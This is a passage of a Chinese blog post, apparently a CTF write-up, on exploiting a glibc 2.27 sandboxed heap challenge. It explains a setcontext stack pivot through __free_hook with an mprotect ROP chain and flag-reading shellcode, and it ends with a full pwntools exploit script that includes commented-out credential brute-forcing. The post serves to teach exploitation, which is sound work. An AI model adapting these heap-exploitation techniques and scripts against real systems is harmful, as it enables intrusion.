+<p>RC4加密其实就是遍历数据,将数据与sbox进行异或加密,而在此之前还需要交换一次sbox的数据<br>交换完之后 再把s[i] + s[j]的组合当做下标再去异或.下面是本题中的加密函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt2</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+23h] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v6 = (v6 + (<span class="type">unsigned</span> __int8)a1[v5]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[v5];</span><br><span class="line">    a1[v5] = a1[v6];</span><br><span class="line">    a1[v6] = v4;</span><br><span class="line">    a2[i] ^= a1[(<span class="type">unsigned</span> __int8)(a1[v5] + a1[v6])];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序在读写的时候都会调用这套加密，创建chunk的时候会将输入加密后存储，read的时候会先解密读完再加密写回去，free则是会先解密再free（还算有点良心？）。</p>
+<h1 id="攻击思路（重要）"><a href="#攻击思路（重要）" class="headerlink" title="攻击思路（重要）"></a>攻击思路（重要）</h1><p>glibc2.27的noexecve的简单沙箱，我们肯定是setcontext栈迁移了，2.27还不用FSOP，直接用hook就行。</p>
+<h2 id="什么是setcontext？"><a href="#什么是setcontext？" class="headerlink" title="什么是setcontext？"></a>什么是setcontext？</h2><p>这是一个glibc库中的函数，用于恢复上下文。询问ai给出的答案是，这个函数一是可以用于在用户态实现线程和协程，二是作为POSIX标准的残留接口保留了下来。</p>
+<p>这个函数牛逼在什么地方呢，它既然是涉及到切换上下文，那么肯定是对大量的寄存器赋值。这个函数中有<code>mov rsp,xxx</code>这样的gadget，我们可以利用这个东西在用户态劫持栈，实现<br>stack pivot。这种攻击方式在沙箱heap中非常常见，如果我们能劫持一次控制流，就总能想办法用这个gadget实现栈迁移最后ROP。</p>
+<p>在glibc较低的版本中，非常好的地方是，这个函数对rsp赋值还是基于rdi的。以本题为例，<code>setcontext+53</code>的地方存放的是这样的一条指令：<code>mov rsp, [rdi+0xa0]</code>。rdi是我们喜闻乐见的，好控制的寄存器，<br>因此这个很好用。如果我们函数第一参数是一个可控的指针，那就任意栈迁移了，于是可以结合free_hook去利用。</p>
+<p>另外，在较高的版本中比如glibc2.35，这个函数不再依据rdi赋值，而是变成了rdx（偏移也变成了setcontext+61）。这让我们的利用难度有所增加但是不多，因为我们能找到交换rdx和rdi的gadget。以glibc2.35为例，就在0x167420这么一个gadget：<code>0x0000000000167420 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>, 将<code>rdi+8</code>指向的内容赋值给rdx，将rax写入栈顶，然后跳到<code>rdx+0x20</code>指向的位置执行。这样我们就能间接地实现将rdi和rdx关联起来，利用rdi给rdx赋值然后再setcontext</p>
+<p>最后setcontext这段函数在给rsp赋值后，会<code>mov rcx,[rdi+0xa8]</code>然后<code>push rcx</code>最后ret，因此我们在fakestack地址+0x8的位置就可以写入我们接下来要执行的内容。好用</p>
+<blockquote>
+<p>另外，基于上下文切换还存在一种叫做“SROP”的攻击方法，是利用信号中断等方式，通过在栈上伪造上下文达成控制流劫持，和我们用setcontexgt的gadget有点点类似</p>
+</blockquote>
+<h2 id="回到题目…"><a href="#回到题目…" class="headerlink" title="回到题目…"></a>回到题目…</h2><p>因此，在低版本还有hook的时候，我们对于沙箱heap题的思路就是free_hook+setcontext栈迁移rop。rop有两种思路，一种是纯rop去libc中找orw，另一种是写shellcode，然后用mprotect先把heap可执行。由于第一次接触时看的exp采用后者，下面笔者也使用后者的方法。</p>
+<p>对于开了沙箱的题目，首先应该动调到我们能够手动控制分配的地方，观察堆的排布，从而确定我们接下来分配的size和堆风水需求，一般tcache和smallbin会比较乱，一般会挑一个size通过取和放将tcache填满后进行我们后续的工作。</p>
+<p>对本题来说具体的攻击步骤如下：</p>
+<ol>
+<li>简单堆风水，然后用unsortedbin泄露libc，用tcache泄露堆地址</li>
+<li>准备工作，先在一个chunk1中布局我们的fakestack（具体内容见后续）</li>
+<li>然后在另一个chunk2里填充0xa0垃圾数据后，在0xa0偏移写入fakestack的栈顶（chunk1对应位置），然后在0xa8写入ret的gadget地址</li>
+<li>任意地址分配chunk分配到freehook处，在freehook写入setcontext+53的地址</li>
+<li>最后free掉chunk2，触发</li>
+</ol>
+<p>此时经历了下述流程：<br>free_hook(rdi&#x3D;chunk2_addr)<br>-&gt;(mov rsp,[rdi+0xa0]，此时rsp内是chunk1_addr，栈已经被换)<br>-&gt;(mov rcx,[rdi+0xa8];push rcx，此时栈顶是一个ret的地址)<br>-&gt;ret两次，第二次ret就启动了我们fakestack上的rop链</p>
+<h2 id="一些板子"><a href="#一些板子" class="headerlink" title="一些板子"></a>一些板子</h2><p>关于fakestack的布置，这里写一个板子，因为我们首先要调用mprotect，因此要这么布置（开始可以填很多ret无所谓的）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p64(ret)</span><br><span class="line">+p64(pop_rdi)</span><br><span class="line">+p64(heap_base)</span><br><span class="line">+p64(pop_rsi)</span><br><span class="line">+p64(<span class="number">0x7000</span>)（size，无所谓，大点也好）</span><br><span class="line">+p64(pop_rdx)</span><br><span class="line">+p64(<span class="number">0x7</span>)</span><br><span class="line">+p64(mprotect)（直接libc.sym就行）</span><br><span class="line">+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x58</span>)（指向shellcode，也就是下一行的起始地址就行）</span><br><span class="line">+asm(shellcode)（orw）</span><br></pre></td></tr></table></figure>
+<p>然后shellcode如下，buffer随便写一个能读写的地址就行，heap+0x3000这种</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">    + shellcraft.read(<span class="string">&quot;rax&quot;</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最简单的沙箱堆，但是也花了小半天来复现。更高的版本也无非就是用fsop的链子，那一次的控制流劫持换到其他点然后后续还是一样的。或者是先跳到magic_gadget，就是麻烦了点。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># p=remote(&quot;0192d66238177833936ff330dfec8bbd.huj5.dg04.ciihw.cn&quot;,43631)</span></span><br><span class="line"><span class="comment"># charset = &quot;\nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 爆破用户名</span></span><br><span class="line"><span class="comment"># def crack_username():</span></span><br><span class="line"><span class="comment">#     username = b&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         for char in range(1, 128):</span></span><br><span class="line"><span class="comment">#             if(char == 10):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             crack=username + char.to_bytes()</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your username:&#x27;, crack)</span></span><br><span class="line"><span class="comment">#             p.recvline()</span></span><br><span class="line"><span class="comment">#             result=p.recvline()</span></span><br><span class="line"><span class="comment">#             if(result==b&#x27;Invalid username!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Invalid username length!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 username += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Username correct!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 username += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(username)</span></span><br><span class="line"><span class="comment">#                 return username</span></span><br><span class="line"><span class="comment"># # 4dm1n</span></span><br><span class="line"><span class="comment"># def crack_password():</span></span><br><span class="line"><span class="comment">#     password=b&#x27;985da4f8cb37zkj&#x27;</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         for char in range(1,128):</span></span><br><span class="line"><span class="comment">#             if(char == 10):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             crack=password + char.to_bytes()</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your username:&#x27;, b&#x27;4dm1n&#x27;)</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your password:&#x27;, crack)</span></span><br><span class="line"><span class="comment">#             p.recvline()</span></span><br><span class="line"><span class="comment">#             result=p.recvline()</span></span><br><span class="line"><span class="comment">#             if(result==b&#x27;Invalid password!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Invalid password length!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 password += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(password)</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Password correct!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 password += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(password)</span></span><br><span class="line"><span class="comment">#                 return password</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(crack_username())</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p=elf.process()</span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value: &#x27;</span>,value)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;The result is:\n\t[key,value] = &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">    value=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(value)</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># size取决于我们创建时的输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value: &#x27;</span>,value)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;s4cur1ty_p4ssw0rd&#x27;</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"><span class="comment"># 4dm1n</span></span><br><span class="line"><span class="comment"># 985da4f8cb37zkj</span></span><br><span class="line"><span class="comment"># s4cur1ty_p4ssw0rd</span></span><br><span class="line"><span class="comment"># glibc 2.27 heap 沙箱no execve</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, <span class="string">b&#x27;4dm1n&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your password:&#x27;</span>, <span class="string">b&#x27;985da4f8cb37zkj&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0-6 填入tcache，7进unsorted,加一个8分割</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    add(i,(<span class="number">0x290</span>),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x290</span>)</span><br><span class="line">    <span class="comment">#print(f&quot;alloc &#123;i&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">    <span class="comment">#print(f&quot;delete &#123;i&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">leak_addr=show(<span class="number">7</span>)<span class="comment"># delete会还原内容，而泄露会再过一遍rc4</span></span><br><span class="line">leak_addr=cipher.decrypt(leak_addr)</span><br><span class="line">leak_addr=u64(leak_addr[:<span class="number">8</span>])</span><br><span class="line">main_arena_addr=leak_addr-<span class="number">96</span></span><br><span class="line">libc_base=main_arena_addr-<span class="number">0x3ebca0</span>+<span class="number">0x60</span></span><br><span class="line">libc.address=libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每次重新初始化，这是个流密码不然会继续，草</span></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">leak_addr=show(<span class="number">1</span>)</span><br><span class="line">leak_addr=cipher.decrypt(leak_addr)</span><br><span class="line"><span class="built_in">print</span>(leak_addr)</span><br><span class="line">leak_addr=u64(leak_addr[:<span class="number">8</span>])</span><br><span class="line">heap_base=leak_addr-<span class="number">0x1670</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] heap_base: <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunks : $rebase(0x203080)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始</span></span><br><span class="line">free_hook=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="comment"># malloc_hook=libc_base + 0x3ebc30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] free_hook: &quot;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line">gadget=libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line"><span class="comment"># open_addr=libc.symbols[&#x27;open&#x27;]</span></span><br><span class="line"><span class="comment"># read_addr=libc.symbols[&#x27;read&#x27;]</span></span><br><span class="line"><span class="comment"># write_addr=libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># print(&quot;[+] orw: &quot;,hex(open_addr),hex(read_addr),hex(write_addr))</span></span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># 把tcache里开始的0x50拿出来</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">payload1=p64(free_hook)</span><br><span class="line">payload1=cipher.encrypt(payload1)</span><br><span class="line">edit(<span class="number">9</span>,payload1)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># 下一个是freehook</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_stack=heap_base+0x1670</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2164f</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x23a6a</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x1b96</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br><span class="line">buffer=heap_base+<span class="number">0x3000</span> <span class="comment"># 随便写的</span></span><br><span class="line">shellcode = (</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">    + shellcraft.read(<span class="string">&quot;rax&quot;</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">)</span><br><span class="line">shellcode=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(ret)+p64(pop_rdi)+p64(heap_base)+p64(pop_rsi)+p64(<span class="number">0x7000</span>)+p64(pop_rdx)+p64(<span class="number">0x7</span>)+p64(mprotect)+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x58</span>)+asm(shellcode)</span><br><span class="line"><span class="comment"># fake_stack=b&#x27;\x00&#x27;*0x10</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(heap_base+0x24c8)+p64(pop_rsi)+p64(0)+p64(libc_base+0x10fbf0)</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x40)+p64(libc_base+0x110020)</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(1)+p64(libc_base+0x1100f0)</span></span><br><span class="line"><span class="comment"># fake_stack+=b&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tmd有点看运气，地址随机里面有0a就gg</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b free&#x27;</span>)</span><br><span class="line"><span class="comment"># free1 将栈迁移到0上</span></span><br><span class="line"><span class="comment"># 还有一个问题就是迁移时候的指令状态</span></span><br><span class="line">payload2=<span class="string">b&#x27;z&#x27;</span>*<span class="number">0xa0</span>+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x10</span>)+p64(ret)</span><br><span class="line"><span class="comment"># 读到0xa会断，所以free掉让它变明文？？？</span></span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">edit(<span class="number">1</span>,payload2)<span class="comment">#这个能通</span></span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">edit(<span class="number">0</span>,shellcode)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>,cipher.encrypt(p64(gadget))) </span><br><span class="line"><span class="comment">#free_hook写入了gadget，下次free会将栈迁移到free的chunk+0xa0写的内容</span></span><br><span class="line"><span class="comment"># 到这都成功了</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/" title="How2Heap实战——强网杯2024babyheap">
+                    <div class="nextTitle">How2Heap实战——强网杯2024babyheap</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2024/11/10/CHOP%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024expect-number-wp/" title="CHOP——强网杯2024expect_number wp">
+                    <div class="prevTitle">CHOP——强网杯2024expect_number wp</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:zj_w1nd@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/ZjW1nd" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://steamcommunity.com/id/ZJwind/" class="iconfont-archer steam" target="_blank" title=steam></a>
+            
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span> readers</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
